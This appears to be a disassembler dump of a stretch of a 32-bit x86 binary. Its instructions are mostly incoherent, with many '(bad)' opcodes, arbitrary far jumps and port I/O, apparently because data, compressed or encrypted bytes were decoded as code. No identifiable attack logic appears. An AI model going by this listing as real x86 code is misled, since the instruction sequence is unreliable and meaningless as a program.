  41b65b:	jno    0x41b5e7
  41b65d:	add    BYTE PTR [eax],al
  41b65f:	add    BYTE PTR [eax],al
  41b661:	add    dh,al
  41b663:	aaa    
  41b664:	sti    
  41b665:	addr16 sti 
  41b667:	out    dx,eax
  41b668:	fidiv  WORD PTR [edi-0x5c01975c]
  41b66e:	aas    
  41b66f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b670:	sbb    DWORD PTR [edx+eax*4],0xf3000132
  41b677:	add    al,0x0
  41b679:	add    BYTE PTR [ebx],cl
  41b67b:	mov    edx,0x1e886ff8
  41b680:	stc    
  41b681:	daa    
  41b682:	cs ins BYTE PTR es:[edi],dx
  41b684:	daa    
  41b685:	mov    edi,0x5bc774ae
  41b68a:	mov    ch,al
  41b68c:	push   edx
  41b68d:	xor    BYTE PTR ds:0xae51dcfb,0x66
  41b694:	add    BYTE PTR [ebx],dl
  41b696:	cmp    eax,0x6cb93882
  41b69b:	test   edi,0x23310878
  41b6a1:	add    al,0x7a
  41b6a3:	aaa    
  41b6a4:	push   0x5d
  41b6a6:	jmp    0x41b659
  41b6a8:	imul   edi,DWORD PTR [esi+0x53d5f0ad],0xdc77e268
  41b6b2:	js     0x41b6b1
  41b6b4:	adc    dh,BYTE PTR [ecx+eiz*8]
  41b6b7:	test   eax,0x8a289b5d
  41b6bc:	lahf   
  41b6bd:	cli    
  41b6be:	fiadd  WORD PTR [edx]
  41b6c0:	xor    al,0xfa
  41b6c2:	adc    BYTE PTR [edx+0x32],dh
  41b6c5:	rol    dh,cl
  41b6c7:	js     0x41b64a
  41b6c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6ca:	enter  0xa207,0x99
  41b6ce:	xchg   edx,eax
  41b6cf:	loop   0x41b6b4
  41b6d1:	push   ecx
  41b6d2:	or     eax,0x8d15b326
  41b6d7:	rcr    BYTE PTR [esp+0x17],cl
  41b6db:	mov    cl,cl
  41b6dd:	stos   BYTE PTR es:[edi],al
  41b6de:	xor    esi,DWORD PTR [esi+0x19]
  41b6e1:	cmp    eax,0xaf795b3c
  41b6e6:	leave  
  41b6e7:	lea    edx,[edx+0x45]
  41b6ea:	rcl    BYTE PTR [edi+0x35903df1],cl
  41b6f0:	and    ebx,DWORD PTR [edi+ebp*1]
  41b6f3:	retf   0x2583
  41b6f6:	ret    0xa513
  41b6f9:	jecxz  0x41b6f5
  41b6fb:	or     eax,0xb2c382e1
  41b700:	rcl    dl,0x81
  41b703:	lock and dh,BYTE PTR [ecx-0x2]
  41b707:	lahf   
  41b708:	sub    eax,0xde49406a
  41b70d:	daa    
  41b70e:	fs loopne 0x41b738
  41b711:	mov    ah,0xd5
  41b713:	out    0x7,eax
  41b715:	jb     0x41b6cb
  41b717:	test   eax,0x255b1b80
  41b71c:	xchg   edi,eax
  41b71d:	shr    BYTE PTR [eax+eiz*2],0x5a
  41b721:	mov    DWORD PTR [edi+0x1aba92ee],ebp
  41b727:	aam    0xb1
  41b729:	adc    edx,esi
  41b72b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  41b72d:	jne    0x41b787
  41b72f:	loop   0x41b75a
  41b731:	jno    0x41b756
  41b733:	in     eax,0x37
  41b735:	sub    BYTE PTR [ebx],ch
  41b737:	lea    edi,[edx]
  41b739:	cmc    
  41b73a:	ret    0x5fc5
  41b73d:	push   esp
  41b73e:	ds aad 0x6e
  41b741:	(bad)  
  41b742:	jmp    0xed52:0xbd4375ba
  41b749:	rcr    BYTE PTR [esp+ecx*8-0x5a],1
  41b74d:	popa   
  41b74e:	ins    BYTE PTR es:[edi],dx
  41b74f:	test   ecx,esi
  41b751:	dec    eax
  41b752:	data16 test BYTE PTR [edi+ecx*2+0xd06f997],dh
  41b75a:	mov    ecx,0x83922360
  41b75f:	arpl   WORD PTR [eax],si
  41b761:	sub    BYTE PTR [edi-0x23],al
  41b764:	mov    dl,0xc9
  41b766:	push   eax
  41b767:	cmp    ecx,0xd5cedf82
  41b76d:	push   esp
  41b76e:	mov    ebp,0xa38bde63
  41b773:	fisub  DWORD PTR [esi+0x6de7b0f3]
  41b779:	icebp  
  41b77a:	sbb    BYTE PTR [ebp+0x4047c7ae],bl
  41b780:	imul   edx,DWORD PTR [edi-0x7c],0x48
  41b784:	outs   dx,BYTE PTR ds:[esi]
  41b785:	mov    dl,0x13
  41b787:	jnp    0x41b784
  41b789:	std    
  41b78a:	mov    BYTE PTR [edi],bl
  41b78c:	inc    edi
  41b78d:	and    edi,0x30
  41b790:	std    
  41b791:	pusha  
  41b792:	lods   eax,DWORD PTR ds:[esi]
  41b793:	cdq    
  41b794:	pop    ss
  41b795:	outs   dx,DWORD PTR ds:[esi]
  41b796:	and    al,0xda
  41b798:	int3   
  41b799:	xchg   BYTE PTR [edi],ah
  41b79b:	ss js  0x41b769
  41b79e:	dec    eax
  41b79f:	ds es mov edi,0xe5d166b3
  41b7a6:	into   
  41b7a7:	xor    BYTE PTR [ecx],ah
  41b7a9:	pop    ss
  41b7aa:	and    DWORD PTR [ebp-0x3bb15736],edi
  41b7b0:	je     0x41b79c
  41b7b2:	into   
  41b7b3:	jne    0x41b82a
  41b7b5:	fs jb  0x41b794
  41b7b8:	mov    esi,0xab0e0905
  41b7bd:	push   ss
  41b7be:	add    dh,BYTE PTR [esi*4-0x415db54e]
  41b7c5:	dec    ebx
  41b7c6:	test   BYTE PTR [ecx+0x3a653364],ch
  41b7cc:	mov    edx,esp
  41b7ce:	inc    esp
  41b7cf:	sbb    BYTE PTR ds:0x936472c9,al
  41b7d5:	mov    edi,0xdbdb5df8
  41b7da:	xchg   ebx,eax
  41b7db:	pop    ebx
  41b7dc:	cdq    
  41b7dd:	fdiv   DWORD PTR [ebx+edi*2-0x18]
  41b7e1:	test   al,0xce
  41b7e3:	pop    edx
  41b7e4:	pop    ds
  41b7e5:	jnp    0x41b775
  41b7e7:	fbld   TBYTE PTR [esi-0x45906206]
  41b7ed:	adc    al,0xbd
  41b7ef:	lahf   
  41b7f0:	inc    DWORD PTR [esi+0x40]
  41b7f3:	shl    BYTE PTR [eax-0x4272642],0xa8
  41b7fa:	adc    ebp,edi
  41b7fc:	cs xchg esp,eax
  41b7fe:	cmc    
  41b7ff:	sti    
  41b800:	push   esp
  41b801:	icebp  
  41b802:	leave  
  41b803:	add    eax,0xac3ea748
  41b808:	scas   al,BYTE PTR es:[edi]
  41b809:	enter  0x13aa,0xc3
  41b80d:	popa   
  41b80e:	mov    ebx,0x2b08e726
  41b813:	push   es
  41b814:	or     esp,eax
  41b816:	mov    BYTE PTR gs:[ecx+0x51],ah
  41b81a:	or     al,0xb4
  41b81c:	push   ds
  41b81d:	sbb    edi,DWORD PTR [ebx]
  41b81f:	jp     0x41b7a1
  41b821:	and    al,0x5e
  41b823:	jno    0x41b85a
  41b825:	jge    0x41b80a
  41b827:	cmp    DWORD PTR [eax-0x4fd9f566],esi
  41b82d:	jg     0x41b7e7
  41b82f:	pop    ebp
  41b830:	jns    0x41b7d1
  41b832:	call   0x5336:0x13dd2f3
  41b839:	imul   ecx,DWORD PTR [edx+0x3e],0xffffff84
  41b83d:	fmul   QWORD PTR [bx+di+0x66b6]
  41b842:	div    dl
  41b844:	mov    esi,0x3fffb3e3
  41b849:	out    0x1b,al
  41b84b:	jae    0x41b85b
  41b84d:	mov    al,0x65
  41b84f:	dec    edi
  41b850:	cmp    edx,DWORD PTR [eax+0x2d1cbc2b]
  41b856:	ins    DWORD PTR es:[edi],dx
  41b857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b858:	out    0x7e,eax
  41b85a:	lds    esp,FWORD PTR [eax+ebp*4-0x5c]
  41b85e:	test   eax,0xa87be91c
  41b863:	jp     0x41b8c0
  41b865:	jmp    0x41b80b
  41b867:	sahf   
  41b868:	add    DWORD PTR [edi],edx
  41b86a:	sbb    ebx,0xd0699f67
  41b870:	fiadd  WORD PTR [bp+di]
  41b873:	mov    eax,0x24af4ec4
  41b878:	inc    ebp
  41b879:	fistp  QWORD PTR [eax+0x60]
  41b87c:	pop    ecx
  41b87d:	xlat   BYTE PTR ds:[ebx]
  41b87e:	mov    eax,ds:0x180ba125
  41b883:	nop
  41b884:	mov    edi,DWORD PTR [ebx+0x22]
  41b887:	xlat   BYTE PTR ds:[ebx]
  41b888:	loop   0x41b8d8
  41b88a:	pop    edi
  41b88b:	(bad)  
  41b88c:	popa   
  41b88d:	ss push cs
  41b88f:	outs   dx,DWORD PTR ds:[esi]
  41b890:	mov    al,0xf8
  41b892:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b893:	sub    esi,edi
  41b895:	push   ss
  41b896:	push   0xb79575af
  41b89b:	shl    BYTE PTR [eax-0x59],0xae
  41b89f:	fs enter 0x6692,0xb2
  41b8a4:	cli    
  41b8a5:	xor    edi,DWORD PTR [eax]
  41b8a7:	fdivr  QWORD PTR [esp+ebx*8+0x6d]
  41b8ab:	lods   eax,DWORD PTR ds:[esi]
  41b8ac:	and    al,0xc6
  41b8ae:	scas   eax,DWORD PTR es:[edi]
  41b8af:	(bad)  
  41b8b0:	sbb    bl,BYTE PTR [esi-0x26]
  41b8b3:	mov    ds:0xc91256be,al
  41b8b8:	xlat   BYTE PTR ds:[ebx]
  41b8b9:	leave  
  41b8ba:	loopne 0x41b87e
  41b8bc:	std    
  41b8bd:	loope  0x41b8e5
  41b8bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b8c0:	push   ds
  41b8c1:	sbb    ecx,DWORD PTR [edi-0x34]
  41b8c4:	addr16 iret 
  41b8c6:	in     al,dx
  41b8c7:	sub    dl,BYTE PTR [esi+ebx*1]
  41b8ca:	shr    ebp,0x18
  41b8cd:	jae    0x41b8de
  41b8cf:	fild   QWORD PTR [esi+ebp*1]
  41b8d2:	sbb    DWORD PTR ds:0x6efc963,esp
  41b8d8:	add    BYTE PTR [edx-0x11c95dbd],0x37
  41b8df:	into   
  41b8e0:	mov    ah,0xdb
  41b8e2:	sub    ah,BYTE PTR [eax+0x6955fcd9]
  41b8e8:	pop    esp
  41b8e9:	mov    ecx,0x6078008a
  41b8ee:	fimul  WORD PTR [ebx]
  41b8f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b8f1:	test   BYTE PTR [edi+edx*4+0x16],al
  41b8f5:	rcr    DWORD PTR [esi+0x68a8111a],0xf6
  41b8fc:	mov    ch,0x1d
  41b8fe:	or     ecx,DWORD PTR [ecx+0xa957a69]
  41b904:	mov    bl,0x7
  41b906:	jmp    0xb539c0a
  41b90b:	or     bl,dh
  41b90d:	sbb    DWORD PTR es:[ecx-0x6431779d],ebp
  41b914:	xchg   ecx,eax
  41b915:	jae    0x41b8f7
  41b917:	xor    bh,BYTE PTR [edi]
  41b919:	in     eax,dx
  41b91a:	push   edi
  41b91b:	add    ebx,DWORD PTR [edi+0x16]
  41b91e:	fdivrp st(4),st
  41b920:	stc    
  41b921:	push   ebp
  41b922:	jno    0x41b8a4
  41b924:	jne    0x41b900
  41b926:	and    esi,ebx
  41b928:	jo     0x41b949
  41b92a:	pop    edi
  41b92b:	out    0x0,eax
  41b92d:	mov    cl,0xbf
  41b92f:	js     0x41b9ac
  41b931:	ret    0x5d86
  41b934:	adc    al,0xcf
  41b936:	(bad)  
  41b937:	mov    eax,ds:0x240ff5c8
  41b93c:	fwait
  41b93d:	fwait
  41b93e:	in     al,0xb6
  41b940:	sbb    ebp,DWORD PTR [esi+0x56]
  41b943:	xchg   esp,eax
  41b944:	mov    ds:0xb43f9a8,eax
  41b949:	mov    ds:0xa3d9443a,al
  41b94e:	push   ebx
  41b94f:	sub    eax,0x12a35a31
  41b954:	inc    esi
  41b955:	inc    eax
  41b956:	ins    DWORD PTR es:[edi],dx
  41b957:	cdq    
  41b958:	lock arpl WORD PTR [ebp-0x20],di
  41b95c:	and    bh,BYTE PTR [edx-0x2f757029]
  41b962:	and    BYTE PTR [edx],cl
  41b964:	pushf  
  41b965:	pop    edx
  41b966:	inc    ecx
  41b967:	xchg   edx,eax
  41b968:	mov    bh,0xce
  41b96a:	mov    dl,0x1d
  41b96c:	or     al,0x46
  41b96e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b96f:	or     cl,BYTE PTR [edx]
  41b971:	inc    esi
  41b972:	test   DWORD PTR [ecx],ebx
  41b974:	int3   
  41b975:	xor    eax,0xca8a2017
  41b97a:	sub    DWORD PTR [ecx],eax
  41b97c:	push   ds
  41b97d:	aaa    
  41b97e:	loopne 0x41b96d
  41b980:	neg    DWORD PTR [ebx]
  41b982:	ficomp WORD PTR [ebx-0x6422d2fd]
  41b988:	stos   DWORD PTR es:[edi],eax
  41b989:	adc    bh,BYTE PTR [edx+0x5da3926c]
  41b98f:	push   es
  41b990:	ror    BYTE PTR [edx+0x19],1
  41b993:	sub    eax,0xa76583f
  41b998:	push   cs
  41b999:	dec    ebp
  41b99a:	jne    0x41b994
  41b99c:	outs   dx,DWORD PTR ds:[esi]
  41b99d:	xor    cl,bh
  41b99f:	adc    BYTE PTR [esi+eiz*1],bl
  41b9a2:	mov    esi,ebp
  41b9a4:	inc    esi
  41b9a5:	popf   
  41b9a6:	in     al,dx
  41b9a7:	inc    ebp
  41b9a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a9:	ss out dx,al
  41b9ab:	sti    
  41b9ac:	add    bl,BYTE PTR [edx-0xc]
  41b9af:	add    BYTE PTR [esi*8-0x4741befe],dh
  41b9b6:	dec    DWORD PTR [eax*1-0x1c7c0f8f]
  41b9bd:	cld    
  41b9be:	fsub   DWORD PTR [ecx-0x61]
  41b9c1:	xor    eax,0x496a2c54
  41b9c6:	fisttp WORD PTR [edi]
  41b9c8:	inc    esi
  41b9c9:	fisttp DWORD PTR [esi]
  41b9cb:	cmp    eax,0xf9ee2e17
  41b9d0:	(bad)  
  41b9d1:	cmp    ecx,eax
  41b9d3:	xchg   ebx,eax
  41b9d4:	or     bh,BYTE PTR fs:[edi+0x9]
  41b9d8:	xor    edx,ebp
  41b9da:	ret    0x2ba2
  41b9dd:	pop    edi
  41b9de:	jmp    0xd244dddf
  41b9e3:	cld    
  41b9e4:	in     al,dx
  41b9e5:	les    ecx,FWORD PTR [eax-0x2ad07722]
  41b9eb:	jmp    0x41ba6a
  41b9ed:	out    0x41,al
  41b9ef:	daa    
  41b9f0:	enter  0xafad,0xc4
  41b9f4:	fidivr DWORD PTR cs:[edx-0x23]
  41b9f8:	dec    ecx
  41b9f9:	repnz lea ebx,[edx-0x47e3049b]
  41ba00:	and    al,0x75
  41ba02:	into   
  41ba03:	pusha  
  41ba04:	xor    BYTE PTR [ecx+esi*4+0x43543c9],ah
  41ba0b:	mov    al,ds:0xe8d6ca77
  41ba10:	fld    st(7)
  41ba12:	jbe    0x41ba6d
  41ba14:	push   0x31
  41ba16:	fisttp QWORD PTR ds:0xffaf67fb
  41ba1c:	test   al,0x7d
  41ba1e:	sub    BYTE PTR [esi],0xef
  41ba21:	inc    ebx
  41ba22:	cwde   
  41ba23:	xor    DWORD PTR [eax-0x1b],edi
  41ba26:	or     BYTE PTR [ebx-0x77],ch
  41ba29:	sbb    esi,DWORD PTR ds:0xa1381e27
  41ba2f:	out    dx,al
  41ba30:	xchg   DWORD PTR [edx],ebx
  41ba32:	or     DWORD PTR [esi+ebx*2-0x6f],eax
  41ba36:	and    al,0x19
  41ba38:	pushf  
  41ba39:	(bad)  
  41ba3a:	cmp    bh,bl
  41ba3c:	inc    ebp
  41ba3d:	add    ebx,ebx
  41ba3f:	pop    ds
  41ba40:	add    eax,0x4670d8a8
  41ba45:	test   BYTE PTR [edi-0x6bc91b57],ch
  41ba4b:	xchg   edx,eax
  41ba4c:	aaa    
  41ba4d:	add    eax,0xe14549eb
  41ba52:	lods   eax,DWORD PTR ds:[esi]
  41ba53:	pop    ss
  41ba54:	ins    BYTE PTR es:[edi],dx
  41ba55:	pop    es
  41ba56:	call   0x8b6236a6
  41ba5b:	xchg   esp,eax
  41ba5c:	mov    eax,ds:0x6d331dfc
  41ba61:	xor    eax,0xe69449b
  41ba66:	pusha  
  41ba67:	xor    ah,BYTE PTR [ebp+ebx*1-0x1e4d9afa]
  41ba6e:	pop    es
  41ba6f:	mov    ch,0xec
  41ba71:	adc    ecx,DWORD PTR [esi]
  41ba73:	faddp  st(5),st
  41ba75:	in     al,dx
  41ba76:	jg     0x41ba42
  41ba78:	adc    eax,0x4090bc73
  41ba7d:	scas   eax,DWORD PTR es:[edi]
  41ba7e:	fwait
  41ba7f:	jnp    0x41bad4
  41ba81:	push   esi
  41ba82:	fisttp DWORD PTR [ebp-0x6c]
  41ba85:	iret   
  41ba86:	sbb    ecx,DWORD PTR [ebp+0x5b]
  41ba89:	or     al,0x1
  41ba8b:	loopne 0x41ba54
  41ba8d:	icebp  
  41ba8e:	mov    dl,0xfb
  41ba90:	jmp    0x79a5e26a
  41ba95:	dec    ecx
  41ba96:	jecxz  0x41bab7
  41ba98:	pop    ss
  41ba99:	dec    esi
  41ba9a:	test   BYTE PTR [edx],0x1d
  41ba9d:	lods   eax,DWORD PTR ds:[esi]
  41ba9e:	lods   eax,DWORD PTR ds:[esi]
  41ba9f:	and    eax,0x3c19ed0b
  41baa4:	in     al,dx
  41baa5:	adc    BYTE PTR [edx],ah
  41baa7:	adc    BYTE PTR [eax+0x34],0x5
  41baab:	sbb    bh,BYTE PTR [edi-0x2a]
  41baae:	mov    eax,0x7790b964
  41bab3:	into   
  41bab4:	mov    ecx,0x8e28708c
  41bab9:	les    ebx,FWORD PTR [esi+0x4bd339bd]
  41babf:	arpl   WORD PTR [esi+eax*1+0x59],dx
  41bac3:	sbb    DWORD PTR [eax-0x1b],edx
  41bac6:	imul   ecx,DWORD PTR [ecx],0xb40bd9d8
  41bacc:	scas   eax,DWORD PTR es:[edi]
  41bacd:	xor    ebp,edx
  41bacf:	push   ss
  41bad0:	cwde   
  41bad1:	call   edx
  41bad3:	xor    bh,ah
  41bad5:	cmp    ch,cl
  41bad7:	je     0x41bab8
  41bad9:	jle    0x41bb4d
  41badb:	jmp    0x9ae11946
  41bae0:	lods   eax,DWORD PTR ds:[esi]
  41bae1:	rcr    DWORD PTR [ecx+ecx*4-0x6d],1
  41bae5:	mov    BYTE PTR [edi-0x45],0x41
  41bae9:	es and ecx,ebx
  41baec:	cmp    DWORD PTR [edx-0x4c7aebfd],edx
  41baf2:	clc    
  41baf3:	enter  0x19a3,0xb4
  41baf7:	adc    esp,DWORD PTR [ebx]
  41baf9:	xor    eax,0x6ee2fd2
  41bafe:	fimul  WORD PTR [ecx-0x2f]
  41bb01:	mov    eax,ds:0xe616e4d4
  41bb06:	xor    ebp,DWORD PTR [ebp-0x15]
  41bb09:	fsub   QWORD PTR [ecx]
  41bb0b:	xchg   edx,eax
  41bb0c:	xor    ebx,ecx
  41bb0e:	(bad)  
  41bb10:	pop    esp
  41bb11:	adc    eax,0xc07f9b07
  41bb16:	push   eax
  41bb17:	(bad)  
  41bb18:	in     eax,0x68
  41bb1a:	mov    esi,esp
  41bb1c:	sahf   
  41bb1d:	loop   0x41baf7
  41bb1f:	(bad)  
  41bb20:	cmp    BYTE PTR [edx],bl
  41bb22:	inc    edi
  41bb23:	test   eax,0x845467b4
  41bb28:	sbb    dl,BYTE PTR [esi+0x25078b14]
  41bb2e:	popa   
  41bb2f:	test   BYTE PTR [eax+0x3e873354],dl
  41bb35:	lahf   
  41bb36:	inc    edi
  41bb37:	adc    al,al
  41bb39:	xchg   esi,eax
  41bb3a:	pop    edi
  41bb3b:	repz pusha 
  41bb3d:	push   ss
  41bb3e:	pop    ebx
  41bb3f:	mov    ebp,0x8e3cac5e
  41bb44:	sub    eax,0xc32c8c98
  41bb49:	test   BYTE PTR [edx-0x5f0808f4],0xc4
  41bb50:	loope  0x41bb36
  41bb52:	pop    esp
  41bb53:	add    edi,DWORD PTR [edi+0xf8f2387]
  41bb59:	outs   dx,BYTE PTR ds:[esi]
  41bb5a:	ins    BYTE PTR es:[edi],dx
  41bb5b:	add    eax,0x42878039
  41bb60:	cmp    esi,DWORD PTR [ebp+eax*8-0x17]
  41bb64:	mov    ch,0xfc
  41bb66:	jbe    0x41baf3
  41bb68:	bound  eax,QWORD PTR [edx-0x4d]
  41bb6b:	(bad)  
  41bb6c:	fild   DWORD PTR [eax]
  41bb6e:	add    BYTE PTR [eax],al
  41bb70:	add    BYTE PTR [eax],al
  41bb72:	out    0x40,al
  41bb74:	sbb    eax,0xee5dbf15
  41bb79:	repz adc eax,0xc3442583
  41bb7f:	pop    es
  41bb80:	repnz jmp 0x4f3:0x13775
  41bb88:	add    BYTE PTR [eax],al
  41bb8a:	pushf  
  41bb8b:	rcl    dl,cl
  41bb8d:	xor    esp,DWORD PTR [ecx-0x42c070f2]
  41bb93:	xchg   BYTE PTR [ebp+0x7a],dh
  41bb96:	sbb    eax,0xebf813a1
  41bb9b:	or     BYTE PTR ds:0x31713dda,ch
  41bba1:	push   ebp
  41bba2:	fistp  WORD PTR [ebx+0x60b1fc03]
  41bba8:	ja     0x41bb6c
  41bbaa:	into   
  41bbab:	pop    edx
  41bbac:	add    ah,bh
  41bbae:	sbb    al,0x15
  41bbb0:	test   al,ah
  41bbb2:	sub    al,BYTE PTR [eax+0x18fce179]
  41bbb8:	sbb    eax,0x36ef10c0
  41bbbd:	in     al,0xd6
  41bbbf:	or     DWORD PTR [ebp+0x32b72975],0xffffffac
  41bbc6:	mov    eax,0x98e3e62c
  41bbcb:	(bad)  
  41bbcc:	ja     0x41bb74
  41bbce:	repnz fstp st(0)
  41bbd1:	gs lock in eax,dx
  41bbd4:	sub    eax,0x7d7ca7d4
  41bbd9:	mov    al,ds:0xf229b154
  41bbde:	xor    eax,0x3690f2bf
  41bbe3:	add    eax,0x5a8805ef
  41bbe8:	test   eax,0x7a3c3175
  41bbed:	sti    
  41bbee:	(bad)  
  41bbef:	adc    ch,BYTE PTR [esi+0x242f5a82]
  41bbf5:	inc    eax
  41bbf6:	test   eax,0x43c45148
  41bbfb:	push   edx
  41bbfc:	sti    
  41bbfd:	xchg   ecx,eax
  41bbfe:	arpl   WORD PTR [esi+0x9],dx
  41bc01:	add    al,0xa7
  41bc03:	mov    al,ds:0xffaa0cdf
  41bc08:	push   eax
  41bc09:	imul   esp,eax,0xffffffdc
  41bc0c:	imul   edi,DWORD PTR [ecx-0x19],0x19
  41bc10:	shl    DWORD PTR [esp+eax*8],1
  41bc13:	mov    bl,0x30
  41bc15:	dec    esp
  41bc16:	and    dl,bl
  41bc18:	fisttp QWORD PTR [ebx+0x13683924]
  41bc1e:	inc    ecx
  41bc1f:	mov    gs,ebx
  41bc21:	mov    al,0x1a
  41bc23:	xchg   ebp,eax
  41bc24:	scas   al,BYTE PTR es:[edi]
  41bc25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc26:	test   al,0xb9
  41bc28:	jmp    0x41bbab
  41bc2a:	xor    BYTE PTR [ebx+0x5d13e70a],ch
  41bc30:	push   esi
  41bc31:	fisub  DWORD PTR [edx-0x13]
  41bc34:	sar    DWORD PTR [edx-0x52],1
  41bc37:	(bad)  
  41bc38:	aaa    
  41bc39:	and    ecx,DWORD PTR [ecx+0x33]
  41bc3c:	sti    
  41bc3d:	jno    0x41bbcf
  41bc3f:	test   al,0xb7
  41bc41:	push   eax
  41bc42:	repnz or DWORD PTR ds:0x94eccee4,ebp
  41bc49:	add    eax,0x75962430
  41bc4e:	les    eax,FWORD PTR [ecx+edx*4+0x14d10715]
  41bc55:	ds sbb eax,0x9d4a40e9
  41bc5b:	sub    eax,0x33140a8c
  41bc60:	inc    eax
  41bc61:	xchg   edx,eax
  41bc62:	in     al,dx
  41bc63:	jno    0x41bca1
  41bc65:	fs out dx,eax
  41bc67:	add    BYTE PTR [ebx],0xc9
  41bc6a:	jmp    DWORD PTR ds:0x1d68edef
  41bc70:	xor    dh,BYTE PTR ds:0x755feed8
  41bc76:	mov    al,0x33
  41bc78:	jl     0x41bc61
  41bc7a:	test   BYTE PTR [ebx],ah
  41bc7c:	dec    eax
  41bc7d:	jno    0x41bc18
  41bc7f:	push   edi
  41bc80:	test   al,0x7d
  41bc82:	add    al,BYTE PTR ds:0x6e8df9e9
  41bc88:	adc    ah,dl
  41bc8a:	push   edx
  41bc8b:	mov    gs,ebp
  41bc8d:	sub    ebp,edx
  41bc8f:	and    DWORD PTR [edx+0x3f],ebx
  41bc92:	dec    edx
  41bc93:	push   edi
  41bc94:	or     dl,bh
  41bc96:	push   0x9531403e
  41bc9b:	div    edx
  41bc9d:	inc    eax
  41bc9e:	call   DWORD PTR [ebp-0x69]
  41bca1:	cld    
  41bca2:	or     BYTE PTR [esi-0x70],al
  41bca5:	push   sp
  41bca7:	mov    al,0x71
  41bca9:	add    ebx,0x6e60c398
  41bcaf:	mov    ss,WORD PTR [esi+edi*1-0x49]
  41bcb3:	outs   dx,BYTE PTR ds:[esi]
  41bcb4:	loope  0x41bcd2
  41bcb6:	cmp    BYTE PTR [edi-0x49],cl
  41bcb9:	mov    ds:0x2a037aa4,eax
  41bcbe:	xchg   esi,eax
  41bcbf:	or     DWORD PTR [ebx+0x3],ebp
  41bcc2:	popa   
  41bcc3:	loopne 0x41bd2f
  41bcc5:	mov    fs,WORD PTR [eax+0x15]
  41bcc8:	jo     0x41bd03
  41bcca:	cmp    al,0x60
  41bccc:	int3   
  41bccd:	mov    ds:0xd8b15f46,al
  41bcd2:	stos   DWORD PTR es:[edi],eax
  41bcd3:	push   edx
  41bcd4:	pop    esi
  41bcd5:	add    edx,DWORD PTR [esi-0xf46babb]
  41bcdb:	mov    ah,0xc
  41bcdd:	(bad)  
  41bcde:	mov    ebp,0xe375950d
  41bce3:	int    0xec
  41bce5:	je     0x41bc8d
  41bce7:	int    0xb0
  41bce9:	mov    dl,0xee
  41bceb:	(bad)  
  41bcec:	ss (bad) 
  41bcee:	ja     0x41bcc8
  41bcf0:	mov    ch,0x3f
  41bcf2:	out    dx,al
  41bcf3:	inc    ebx
  41bcf4:	test   eax,0x7dea0139
  41bcf9:	xchg   esi,eax
  41bcfa:	push   esp
  41bcfb:	jge    0x41bcb7
  41bcfd:	dec    esi
  41bcfe:	lahf   
  41bcff:	pop    ecx
  41bd00:	int3   
  41bd01:	jo     0x41bcf5
  41bd03:	and    DWORD PTR [bx-0x3510],ecx
  41bd08:	mov    dx,0x439e
  41bd0c:	jg     0x41bca0
  41bd0e:	pop    ds
  41bd0f:	pop    DWORD PTR [edi+0x1a]
  41bd12:	cmp    dx,WORD PTR [edi-0x2748d7e8]
  41bd19:	pop    ebp
  41bd1a:	add    eax,0x50a9ba22
  41bd1f:	popf   
  41bd20:	add    al,0x71
  41bd22:	sahf   
  41bd23:	aas    
  41bd24:	inc    ebx
  41bd25:	pop    ebx
  41bd26:	xchg   edi,eax
  41bd27:	inc    esp
  41bd28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd29:	mov    eax,ds:0x1a37086
  41bd2e:	jnp    0x41bcb8
  41bd30:	test   BYTE PTR [edx],0x74
  41bd33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd34:	dec    esp
  41bd35:	mov    ds:0x578ece5e,eax
  41bd3a:	or     edx,DWORD PTR [esi-0x2ec6e5f0]
  41bd40:	cmc    
  41bd41:	sbb    cl,dl
  41bd43:	not    BYTE PTR [edx-0x15]
  41bd46:	mov    edi,0xeac95d8e
  41bd4b:	dec    edx
  41bd4c:	sub    BYTE PTR [ecx-0x4cff24f8],bl
  41bd52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd53:	push   eax
  41bd54:	addr16 pop es
  41bd56:	dec    edi
  41bd57:	sub    BYTE PTR [ebx+0x77],cl
  41bd5a:	cmp    DWORD PTR [eax+0x51],0x39
  41bd5e:	stc    
  41bd5f:	jecxz  0x41bd71
  41bd61:	mov    BYTE PTR [eax],ch
  41bd63:	sub    al,0xda
  41bd65:	je     0x41bcf5
  41bd67:	enter  0xa62b,0x93
  41bd6b:	adc    al,0xd8
  41bd6d:	or     eax,0xf880e266
  41bd72:	rcl    BYTE PTR [ebp+0x3a],1
  41bd75:	sbb    eax,0xa36a8836
  41bd7a:	adc    edi,esp
  41bd7c:	sar    DWORD PTR [edi+0x683cc4ed],0x1d
  41bd83:	sbb    esi,edx
  41bd85:	sub    bh,bl
  41bd87:	cs xor bh,al
  41bd8a:	sti    
  41bd8b:	inc    esp
  41bd8c:	xor    BYTE PTR [esi],dh
  41bd8e:	sbb    esi,DWORD PTR [ebx+0x3a]
  41bd91:	mov    eax,ds:0x36e25a2b
  41bd96:	add    eax,0x86c8e34d
  41bd9b:	mov    DWORD PTR ds:0xe4e65a59,edx
  41bda1:	data16 fisub DWORD PTR [ecx-0x67]
  41bda5:	in     eax,0x39
  41bda7:	aas    
  41bda8:	jbe    0x41bd95
  41bdaa:	inc    edi
  41bdab:	loop   0x41be08
  41bdad:	sbb    DWORD PTR [ecx+0x47],eax
  41bdb0:	shr    BYTE PTR [esi-0x9a5c106],1
  41bdb6:	pop    edi
  41bdb7:	call   0xe6613387
  41bdbc:	je     0x41bd96
  41bdbe:	fcmovnb st,st(0)
  41bdc0:	mov    eax,ds:0xc7b4f2
  41bdc5:	and    esp,DWORD PTR [ebx+0x73135d90]
  41bdcb:	scas   al,BYTE PTR es:[edi]
  41bdcc:	sub    DWORD PTR [ebx],eax
  41bdce:	add    al,0xb1
  41bdd0:	lds    ebx,FWORD PTR [ecx+0x71abb95b]
  41bdd6:	pop    eax
  41bdd7:	pushf  
  41bdd8:	push   0x248f26ff
